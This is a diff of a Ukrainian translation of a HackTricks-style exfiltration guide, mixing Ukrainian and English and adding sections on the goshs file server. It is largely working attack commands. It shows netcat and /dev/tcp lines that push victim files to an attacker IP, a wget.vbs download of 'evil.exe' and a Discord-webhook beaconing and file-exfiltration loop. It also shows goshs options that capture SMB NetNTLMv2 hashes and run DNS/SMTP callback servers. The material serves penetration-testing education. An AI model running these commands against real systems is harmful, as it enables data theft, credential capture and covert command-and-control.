@@ -3,17 +3,17 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> Для повного прикладу розміщення loot у `C:\Users\Public` та exfiltrating його за допомогою Rclone, щоб імітувати легітимні резервні копії, перегляньте робочий процес нижче.
+> Для end-to-end прикладу staging loot у `C:\Users\Public` і exfiltrating його за допомогою Rclone, щоб імітувати legitimate backups, перегляньте workflow нижче.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Часто дозволені у білому списку домени для exfiltrate інформації
+## Commonly whitelisted domains to exfiltrate information
 
-Перевірте [https://lots-project.com/](https://lots-project.com/), щоб знайти поширені домени, додані у білий список, якими можна зловживати
+Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
 
-## Копіювання\&Вставка Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -52,8 +52,8 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Завантаження файлів
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer що виводить GET and POSTs (також заголовки)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Модуль Python [uploadserver](https://pypi.org/project/uploadserver/):
+- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- Python module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -66,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS сервер**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -107,14 +107,47 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) для C2 & Data Exfiltration
+### goshs
 
-Webhooks — це HTTPS-ендпоїнти лише для запису, які приймають JSON та необов'язкові файлові частини. Зазвичай їх дозволяють для довірених SaaS-доменів і вони не вимагають OAuth/API keys, що робить їх корисними для low-friction beaconing і exfiltration.
+[goshs](https://github.com/patrickhener/goshs) — це однофайлова заміна для `python3 -m http.server`
+з upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
+та OOB collaboration features (DNS, SMTP, NTLM hash capture).
+```bash
+# Serve current directory on port 8000
+goshs
+
+# Serve with HTTPS (self-signed)
+goshs -s -ss
+
+# Serve with basic auth
+goshs -b user:password
+
+# Upload-only mode
+goshs -uo
+
+# Read-only mode
+goshs -ro
+
+# Capture SMB NTLM hashes
+goshs -smb -smb-domain CORP
+
+# DNS callback server
+goshs -dns -dns-ip 10.10.10.10
+
+# SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+
+# Tunnel via localhost.run (no port forwarding needed)
+goshs -tunnel
+```
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
+
+Webhooks — це write-only HTTPS endpoints, які приймають JSON і optional file parts. Їх часто дозволяють для trusted SaaS domains і вони не потребують OAuth/API keys, що робить їх корисними для low-friction beaconing і exfiltration.
 
 Key ideas:
-- Ендпоїнт: Discord uses https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data з частиною під назвою payload_json, що містить {"content":"..."} та необов'язковою файловою(ими) частиною(ями) під назвою file.
-- Шаблон циклу оператора: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK підтверджують доставку.
+- Endpoint: Discord використовує https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data з part named payload_json, що містить {"content":"..."} і optional file part(s) named file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK підтверджують delivery.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -184,9 +217,9 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-Примітки:
-- Подібні шаблони застосовуються до інших платформ для співпраці (Slack/Teams), що використовують incoming webhooks; відрегулюйте URL і JSON schema відповідно.
-- Для DFIR артефактів кешу Discord Desktop та відновлення webhook/API див.:
+Notes:
+- Подібні шаблони застосовуються й до інших collaboration platforms (Slack/Teams) з використанням їхніх incoming webhooks; відповідно налаштуйте URL і JSON schema.
+- Для DFIR щодо артефактів кешу Discord Desktop та відновлення webhook/API, див.:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -199,7 +232,7 @@ Start-Sleep -Seconds 20
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP сервер (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -242,7 +275,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Або створіть smb share **за допомогою samba**:
+Або створіть smb share **using samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -265,15 +298,25 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
+### goshs
+[goshs](https://github.com/patrickhener/goshs) — це single-binary альтернатива, яка
+роздає файли через SMB і захоплює NetNTLMv2 hashes від клієнтів, що підключаються:
+```bash
+# Start SMB server with NTLM hash capture
+goshs -smb -smb-domain CORP
+
+# Also works for plain HTTP file serving
+goshs
+```
 ## SCP
 
-Атакувальник повинен мати SSHd запущеним.
+Зловмисник має мати запущений SSHd.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Якщо у жертви є SSH, нападник може змонтувати директорію з жертви на машину нападника.
+Якщо в жертви є SSH, зловмисник може змонтувати директорію з жертви на боці зловмисника.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -291,14 +334,14 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Завантажити файл на victim
+### Завантажити файл на жертву
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-дякуємо **@BinaryShadow\_**
+дякуючи **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -320,13 +363,27 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Якщо ви можете надсилати дані на SMTP-сервер, ви можете створити SMTP-сервер для прийому даних за допомогою python:
+Якщо ви можете надсилати дані на SMTP server, ви можете створити SMTP для отримання даних за допомогою python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) може швидко запустити SMTP server
+для перехоплення email callbacks під час OOB exfiltration scenarios:
+```bash
+# Start SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+```
+Отримані emails і callbacks відображаються безпосередньо у виводі terminal.
+Можна поєднати з DNS callback server для повного OOB coverage:
+```bash
+# DNS + SMTP combined
+goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
+```
 ## TFTP
 
-За замовчуванням в XP та 2003 (в інших його потрібно явно додавати під час встановлення)
+За замовчуванням у XP та 2003 (в інших це потрібно явно додати під час встановлення)
 
 У Kali, **start TFTP server**:
 ```bash
@@ -335,12 +392,12 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP сервер на python:**
+**TFTP server in python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-На **victim**, підключіться до Kali server:
+У **жертві**, підключіться до сервера Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -388,21 +445,22 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Програма `debug.exe` не лише дозволяє переглядати binaries, але й має **можливість відтворювати їх з hex**. Це означає, що, надавши hex для binary, `debug.exe` може згенерувати binary файл. Однак важливо зазначити, що debug.exe має **обмеження на збирання файлів розміром до 64 kb**.
+Програма `debug.exe` не лише дозволяє інспектувати binaries, але також має **можливість відновлювати їх з hex**. Це означає, що, надавши hex binary, `debug.exe` може згенерувати binary file. Однак важливо зазначити, що debug.exe має **обмеження на складання файлів розміром до 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Потім скопіюйте та вставте текст у windows-shell, і буде створено файл з назвою nc.exe.
+Потім скопіюйте й вставте текст у windows-shell, і буде створено файл з назвою nc.exe.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
 
-## Посилання
+## References
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
